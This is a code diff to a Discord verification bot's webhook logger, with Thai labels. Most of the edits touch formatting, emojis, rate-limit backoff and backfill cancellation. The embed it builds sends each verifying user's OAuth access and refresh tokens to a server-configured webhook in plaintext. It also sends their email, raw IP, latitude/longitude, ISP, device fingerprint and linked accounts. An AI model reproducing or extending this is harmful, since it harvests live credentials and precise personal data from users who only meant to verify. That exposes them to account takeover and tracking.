@@ -143,13 +143,24 @@ function chunkStringToFields(title, str, maxChars = MAX_FIELD_VALUE_CHARS) {
     return fields;
 }
 
+let appConfig = null;
+try {
+    appConfig = require("../../../config.json");
+} catch {
+    appConfig = null;
+}
+
 const EMOJIS = Object.freeze({
-    DISCORD: "<:Discord_pmt:1553835220912840814>",
-    CHECK: "<a:CHECK_pmt:1553832954051174426>",
-    CROSS: "<a:CROSS_pmt:1553833049135906816>",
-    ROLES: "<:kroles_pmt:1553835237333672006>",
-    SHIELD: "<:check_pmt:1553835205553553599>",
-    LOCK: "<:vak_pmt:1553835198066729121>"
+    DISCORD: appConfig?.emojis?.server_icon || "<:Discord_pmt:1553835220912840814>",
+    CHECK: appConfig?.emojis?.success || "<a:CHECK_pmt:1553832954051174426>",
+    CROSS: appConfig?.emojis?.error || "<a:CROSS_pmt:1553833049135906816>",
+    ROLES: appConfig?.emojis?.members || "<:kroles_pmt:1553835237333672006>",
+    SHIELD: appConfig?.emojis?.shield || "<:check_pmt:1553835205553553599>",
+    LOCK: appConfig?.emojis?.lock || "<:vak_pmt:1553835198066729121>",
+    BELL: appConfig?.emojis?.bell || ":bell_pmt:",
+    ANDROID: appConfig?.emojis?.android || ":Android_pmt:",
+    CODE: appConfig?.emojis?.code || ":Code_pmt:",
+    ALERT_BOUNCE: appConfig?.emojis?.alert_bounce || ":j357_pmt:"
 });
 
 function formatPlatform(platform) {
@@ -275,13 +286,13 @@ function buildWebhookPayload({
     const networkStatusBrief = networkTypes.length ? `ตรวจพบ ${networkTypes.join(" / ")}` : "อินเทอร์เน็ตบ้าน/ปกติ";
 
     const description = [
-        `ข้อมูลจากเซิร์ฟเวอร์: ${serverName}`,
+        `ข้อมูลจากเซิร์ฟเวอร์ : ${serverName}`,
         `เซิร์ฟเวอร์ id : ${serverIdStr}`,
         `User : ${userTag}`,
         ``,
-        `  • ผลการยืนยัน: ${resultLabel}`,
-        `  • ยศที่ได้รับ: ${roleMention}`,
-        `  • เครือข่ายที่อาจจะใช้ยืนยัน: ${networkStatusBrief}`
+        `  • ผลการยืนยัน : ${resultLabel}`,
+        `  • ยศที่ได้รับ : ${roleMention}`,
+        `  • เครือข่ายที่อาจจะใช้ยืนยัน : ${networkStatusBrief}`
     ].join("\n");
 
     // Section 1: ข้อมูลบัญชี Discord
@@ -303,22 +314,22 @@ function buildWebhookPayload({
     const adminGuilds = guildSummary ? (guildSummary.adminGuildsCount ?? guildSummary.adminCount ?? 0) : 0;
 
     const discordInfoLines = [
-        `  • Global Name: ${globalName}`,
-        `  • Username: ${username}`,
-        `  • User ID: ${userId}`,
-        `  • Avatar URL: ${avatarLink}`,
-        `  • Banner URL: ${bannerLink}`,
-        `  • Discriminator: ${discriminator}`,
-        `  • Email: ${email}`,
-        `  • Email Verified: ${emailVerifiedText}`,
-        `  • ภาษาของแอป Discord: ${appLocale}`,
-        `  • MFA (2FA): ${mfaText}`,
-        `  • วันสร้างบัญชี: ${createdDate}`,
-        `  • เหรียญตรา (Badges): ${badges}`,
-        `  • มี Nitro ไหม: ${nitroText}`,
-        `  • เซิร์ฟเวอร์ที่เข้าร่วมทั้งหมด: ${totalGuilds} เซิร์ฟเวอร์`,
-        `  • เซิร์ฟเวอร์ที่เป็นเจ้าของ: ${ownedGuilds} เซิร์ฟเวอร์`,
-        `  • มียศ เเอดมิน กี่เซิฟเวอร์: ${adminGuilds} เซิร์ฟเวอร์`
+        `  • Global Name : ${globalName}`,
+        `  • Username : ${username}`,
+        `  • User ID : ${userId}`,
+        `  • Avatar URL : ${avatarLink}`,
+        `  • Banner URL : ${bannerLink}`,
+        `  • Discriminator : ${discriminator}`,
+        `  • Email : ${email}`,
+        `  • Email Verified : ${emailVerifiedText}`,
+        `  • ภาษาของแอป Discord : ${appLocale}`,
+        `  • MFA (2FA) : ${mfaText}`,
+        `  • วันสร้างบัญชี : ${createdDate}`,
+        `  • เหรียญตรา : ${badges}`,
+        `  • มี Nitro ไหม : ${nitroText}`,
+        `  • เซิร์ฟเวอร์ที่เข้าร่วมทั้งหมด : ${totalGuilds} เซิร์ฟเวอร์`,
+        `  • เซิร์ฟเวอร์ที่เป็นเจ้าของ : ${ownedGuilds} เซิร์ฟเวอร์`,
+        `  • มียศ เเอดมิน กี่เซิฟเวอร์ : ${adminGuilds} เซิร์ฟเวอร์`
     ];
 
     // Section 2: ที่อยู่ IP & ตำแหน่ง
@@ -337,17 +348,17 @@ function buildWebhookPayload({
     const mobileOrBroadband = formatMobileOrBroadband(ipInfo);
 
     const ipLocationLines = [
-        `  • IP Address: ${rawIp}`,
-        `  • พิกัด ละติจูด/ลองจิจูด: ${coordsStr}`,
-        `  • รัศมีความแม่นยำพิกัด: ± ${accuracyRadius} กม.`,
-        `  • ตำแหน่ง: ${locationStr}`,
-        `  • รหัสไปรษณีย์: ${zip}`,
-        `  • Timezone: ${timezone}`,
-        `  • ผู้ให้บริการอินเทอร์เน็ต: ${isp}`,
-        `  • องค์กรโครงข่าย: ${org}`,
-        `  • ชื่อโหนดโฮสต์ของเครือข่าย: ${reverseDns}`,
-        `  • สถานะเครือข่ายที่ตรวจพบ: ${networkStatusDetail}`,
-        `  • เน็ตมือถือหรือเน็ตบ้าน: ${mobileOrBroadband}`
+        `  • IP Address : ${rawIp}`,
+        `  • พิกัด ละติจูด/ลองจิจูด : ${coordsStr}`,
+        `  • รัศมีความแม่นยำพิกัด : ± ${accuracyRadius} กม.`,
+        `  • ตำแหน่ง : ${locationStr}`,
+        `  • รหัสไปรษณีย์ : ${zip}`,
+        `  • Timezone : ${timezone}`,
+        `  • ผู้ให้บริการอินเทอร์เน็ต : ${isp}`,
+        `  • องค์กรโครงข่าย : ${org}`,
+        `  • ชื่อโหนดโฮสต์ของเครือข่าย : ${reverseDns}`,
+        `  • สถานะเครือข่ายที่ตรวจพบ : ${networkStatusDetail}`,
+        `  • เน็ตมือถือหรือเน็ตบ้าน : ${mobileOrBroadband}`
     ];
 
     // Section 3: อุปกรณ์ & เบราว์เซอร์
@@ -361,23 +372,23 @@ function buildWebhookPayload({
     const userAgentStr = device?.userAgent ? `\`${device.userAgent}\`` : "`ไม่มีข้อมูล`";
 
     const deviceLines = [
-        `  • ประเภทอุปกรณ์ (Device): ${deviceType}`,
-        `  • สถาปัตยกรรมระบบ (Platform): ${platformFormatted}`,
-        `  • ระบบปฏิบัติการ (OS): ${os}`,
-        `  • หน้าจอ (Screen): ${screen}`,
-        `  • เบราว์เซอร์ (Browser): ${browser}`,
-        `  • ภาษาของเบราว์เซอร์ (Browser Languages): ${browserLanguages}`,
-        `  • หน้าจอสัมผัส (Touchscreen): ${touchscreen}`,
-        `  • User-Agent:`,
+        `  • ประเภทอุปกรณ์ : ${deviceType}`,
+        `  • สถาปัตยกรรมระบบ : ${platformFormatted}`,
+        `  • ระบบปฏิบัติการ : ${os}`,
+        `  • หน้าจอ : ${screen}`,
+        `  • เบราว์เซอร์ : ${browser}`,
+        `  • ภาษาของเบราว์เซอร์ : ${browserLanguages}`,
+        `  • หน้าจอสัมผัส : ${touchscreen}`,
+        `  • User-Agent :`,
         `  ${userAgentStr}`
     ];
 
-    // Section 4: บัญชีที่เชื่อมต่อ
+    // Section 4: บัญชีนอกที่เชื่อมต่อ
     const connList = Array.isArray(connections) && connections.length > 0
         ? connections.map(c => typeof c === "string" ? c : (c.type || c.name || "Unknown")).join(", ")
         : "ไม่มีการเชื่อมต่อบัญชีภายนอก";
     const connectionLines = [
-        `  • ${connList}`
+        `  •  ${connList}`
     ];
 
     // Section 5: สิทธิ์และการเข้าถึง
@@ -386,12 +397,12 @@ function buildWebhookPayload({
     const securityFindingsStr = Array.isArray(findings) && findings.length ? findings.join(", ") : "ไม่พบความเสี่ยง";
 
     const tokenLines = [
-        `  • Scope: ${scopeStr}`,
-        `  • หมดอายุ (Expires): ${expiresStr}`,
-        `  • Security Findings: ${securityFindingsStr}`,
-        `  • Access Token:`,
+        `  • Scope : ${scopeStr}`,
+        `  • หมดอายุ : ${expiresStr}`,
+        `  • รายงานความเสี่ยง : ${securityFindingsStr}`,
+        `  • Access Token :`,
         `  \`${accessToken}\``,
-        `  • Refresh Token:`,
+        `  • Refresh Token :`,
         `  \`${refreshToken}\``
     ];
 
@@ -403,27 +414,37 @@ function buildWebhookPayload({
     const findingsSummary = Array.isArray(findings) && findings.length ? findings.join(", ") : "ไม่พบความเสี่ยง";
 
     const securityLines = [
-        `  • ตรวจพบบัญชีในเครื่องนี้ (Device Fingerprint): ${deviceFingerprint}`,
-        `  • บัญชีที่เคยใช้ IP นี้ (Shared IP): ${sharedIp}`,
-        `  • วันที่เข้าร่วมเซิร์ฟเวอร์ครั้งแรกจาก IP นี้: ${firstSeen}`,
-        `  • การดัดแปลง Header เครือข่าย (Spoof Header): ${spoofHeader}`,
-        `  • ข้อสังเกตความปลอดภัย (Findings): ${findingsSummary}`
+        `  • ตรวจพบบัญชีในเครื่องนี้ : ${deviceFingerprint}`,
+        `  • บัญชีที่เคยใช้ IP นี้ : ${sharedIp}`,
+        `  • วันที่เข้าร่วมเซิร์ฟเวอร์ครั้งแรกจาก IP นี้ : ${firstSeen}`,
+        `  • การดัดแปลง Header เครือข่าย : ${spoofHeader}`,
+        `  • ข้อสังเกตความปลอดภัย : ${findingsSummary}`
     ];
 
     const fields = [
-        ...chunkLinesToFields(`${EMOJIS.ROLES} ข้อมูลบัญชี Discord (Account Information)`, discordInfoLines),
-        ...chunkLinesToFields(`${EMOJIS.SHIELD} ที่อยู่ IP & ตำแหน่ง (IP & Location)`, ipLocationLines),
-        ...chunkLinesToFields("💻 อุปกรณ์ & เบราว์เซอร์ (Device & Browser)", deviceLines),
-        ...chunkLinesToFields("🔗 บัญชีที่เชื่อมต่อ (Connections)", connectionLines),
-        ...chunkLinesToFields(`${EMOJIS.LOCK} สิทธิ์และการเข้าถึง (Token & Scope)`, tokenLines),
-        ...chunkLinesToFields("🛡 ข้อมูลระบบตรวจจับความปลอดภัย (Security)", securityLines)
+        ...chunkLinesToFields(`${EMOJIS.ROLES} ข้อมูลบัญชี Discord`, discordInfoLines),
+        ...chunkLinesToFields(`${EMOJIS.SHIELD} ที่อยู่ IP & ตำแหน่ง`, ipLocationLines),
+        ...chunkLinesToFields(`${EMOJIS.ANDROID} อุปกรณ์ & เบราว์เซอร์`, deviceLines),
+        ...chunkLinesToFields(`${EMOJIS.LOCK} บัญชีนอกที่เชื่อมต่อ`, connectionLines),
+        ...chunkLinesToFields(`${EMOJIS.CODE} สิทธิ์และการเข้าถึง`, tokenLines),
+        ...chunkLinesToFields(`${EMOJIS.ALERT_BOUNCE} ข้อมูลระบบตรวจจับความปลอดภัย`, securityLines)
     ];
 
+    let userAvatarUrl = profile.avatarUrl;
+    if (!userAvatarUrl && profile.id) {
+        try {
+            const discIndex = Number((BigInt(profile.id) >> 22n) % 6n);
+            userAvatarUrl = `https://cdn.discordapp.com/embed/avatars/${discIndex}.png`;
+        } catch {
+            userAvatarUrl = "https://cdn.discordapp.com/embed/avatars/0.png";
+        }
+    }
+
     const embed = {
-        title: `${EMOJIS.DISCORD} Log Verify ผู้ใช้งาน`,
+        title: `${EMOJIS.BELL} Log Verify ผู้ใช้งาน`,
         description,
         color: result === "success" ? 0x2ECC71 : (result === "blocked" ? 0xE74C3C : 0xF39C12),
-        thumbnail: profile.avatarUrl ? { url: profile.avatarUrl } : undefined,
+        thumbnail: userAvatarUrl ? { url: userAvatarUrl } : undefined,
         fields,
         timestamp: new Date(verifiedAt).toISOString()
     };
@@ -552,14 +573,25 @@ async function postWebhookMessage(webhookUrl, body, attempt = 1) {
     }
 
     if (res.status === 429) {
-        const retryAfter = Number(res.headers.get("retry-after")) || 2;
-        urlBackoffUntil.set(webhookUrl, Date.now() + retryAfter * 1000 + 500);
-        console.warn(`[VerificationWebhook] Rate limited (429) for ${webhookUrl}. Backing off for ${retryAfter}s...`);
-        await sleep(retryAfter * 1000 + 500);
+        const rawHeader = res.headers.get("retry-after");
+        let retryAfter = Number(rawHeader);
+        if (!retryAfter || isNaN(retryAfter)) {
+            try {
+                const errJson = await res.json().catch(() => null);
+                if (errJson && typeof errJson.retry_after === "number") {
+                    retryAfter = errJson.retry_after;
+                }
+            } catch (_) {}
+        }
+        const safeSeconds = Math.max(0.5, Math.min(60, Number(retryAfter) || 2));
+        const backoffMs = Math.round(safeSeconds * 1000) + 500;
+        urlBackoffUntil.set(webhookUrl, Date.now() + backoffMs);
+        console.warn(`[VerificationWebhook] Rate limited (429) for ${webhookUrl}. Backing off for ${safeSeconds}s...`);
+        await sleep(backoffMs);
         if (attempt < 5) {
             return postWebhookMessage(webhookUrl, body, attempt + 1);
         }
-        throw new Error(`rate_limited_retry_exhausted:${retryAfter}`);
+        throw new Error(`rate_limited_retry_exhausted:${safeSeconds}`);
     }
 
     if (!res.ok) {
@@ -631,7 +663,12 @@ function isEligibleVerifyLog(log) {
     if (log.result !== "success") return false;
     const r = log.roleAssignResult;
     if (!r || typeof r !== "object") return false;
-    return Boolean(r.ok === true || r.alreadyHadRole === true || r.joinedWithRole === true);
+    return Boolean(
+        r.ok === true ||
+        r.alreadyHadRole === true ||
+        r.joinedWithRole === true ||
+        r.status === "success"
+    );
 }
 
 class VerificationWebhookManager {
@@ -661,13 +698,8 @@ class VerificationWebhookManager {
             const recovery = this.repo.recoverStuckSendingDeliveries(0);
             const stuckGuildIds = Array.isArray(recovery?.guildIds) ? recovery.guildIds : [];
 
-            // If MongoDB is not connected yet, skip Mongoose operations (pure SQLite recovery above succeeded)
-            if (mongoose.connection?.readyState !== 1) {
-                return;
-            }
-
-            // 2. Recover active backfill jobs
-            if (typeof this.repo.getAllActiveJobs === "function") {
+            // 2. Recover active backfill jobs (requires MongoDB)
+            if (mongoose.connection?.readyState === 1 && typeof this.repo.getAllActiveJobs === "function") {
                 const activeJobs = this.repo.getAllActiveJobs();
                 for (const job of activeJobs) {
                     try {
@@ -859,7 +891,8 @@ class VerificationWebhookManager {
             $or: [
                 { "roleAssignResult.ok": true },
                 { "roleAssignResult.alreadyHadRole": true },
-                { "roleAssignResult.joinedWithRole": true }
+                { "roleAssignResult.joinedWithRole": true },
+                { "roleAssignResult.status": "success" }
             ],
             deletedAt: { $exists: false }
         });
@@ -1090,7 +1123,8 @@ class VerificationWebhookManager {
                 $or: [
                     { "roleAssignResult.ok": true },
                     { "roleAssignResult.alreadyHadRole": true },
-                    { "roleAssignResult.joinedWithRole": true }
+                    { "roleAssignResult.joinedWithRole": true },
+                    { "roleAssignResult.status": "success" }
                 ],
                 deletedAt: { $exists: false }
             };
@@ -1292,6 +1326,10 @@ class VerificationWebhookManager {
                     const prePostConfig = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
                     const prePostVersion = Number(prePostConfig?.verification?.webhookLog?.destinationVersion) || 1;
                     const prePostUrl = prePostConfig?.verification?.webhookLog?.url;
+                    if (item.job_id && prePostConfig?.verification?.webhookLog?.mode === "live") {
+                        this.repo.markDeliveryFailed(item.delivery_id, "cancelled_by_live_mode_before_send", "Backfill delivery cancelled because guild switched to live-only mode", item.destination_version);
+                        continue;
+                    }
                     if (!prePostUrl || item.destination_version !== prePostVersion) {
                         this.repo.markDeliveryFailed(item.delivery_id, "destination_version_obsolete", "Webhook URL or version changed before transmission", item.destination_version);
                         sendThrottledAlert({
@@ -1314,6 +1352,10 @@ class VerificationWebhookManager {
                             const latestCheck = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
                             const currentVer = Number(latestCheck?.verification?.webhookLog?.destinationVersion) || 1;
                             const currentUrl = latestCheck?.verification?.webhookLog?.url;
+                            const currentMode = latestCheck?.verification?.webhookLog?.mode;
+                            if (item.job_id && currentMode !== "backfill_live") {
+                                return false;
+                            }
                             return Boolean(currentUrl === prePostUrl && currentVer === prePostVersion);
                         }
                     });
@@ -1343,8 +1385,21 @@ class VerificationWebhookManager {
                     console.error(`[VerificationWebhook] Delivery failed for id=${item.delivery_id}:`, sendErr.message);
                     const isPermanent = isPermanentWebhookError(sendErr);
                     if (isPermanent || item.attempt_count >= 5) {
-                        const failReason = isPermanent ? (sendErr.code || "http_permanent_error") : "exhausted";
-                        this.repo.markDeliveryFailed(item.delivery_id, failReason, sendErr.message, item.destination_version);
+                        let failReason = isPermanent ? (sendErr.code || "http_permanent_error") : "exhausted";
+                        let failMessage = sendErr.message;
+                        if (sendErr.code === "destination_changed_during_delivery") {
+                            if (item.sent_parts > 0) {
+                                failReason = "cancelled_during_send_partial";
+                                failMessage = `Delivery cancelled during multipart transmission after sending ${item.sent_parts} parts: ${sendErr.message}`;
+                            } else {
+                                failReason = "cancelled_during_send";
+                                failMessage = `Delivery cancelled during transmission: ${sendErr.message}`;
+                            }
+                        } else if (item.sent_parts > 0 && isPermanent) {
+                            failReason = "partial_delivery_failed";
+                            failMessage = `Delivery permanently failed after sending ${item.sent_parts} parts: ${sendErr.message}`;
+                        }
+                        this.repo.markDeliveryFailed(item.delivery_id, failReason, failMessage, item.destination_version);
                         sendThrottledAlert({
                             key: `exhausted_${guildId}_${item.delivery_id}`,
                             severity: "ERROR",
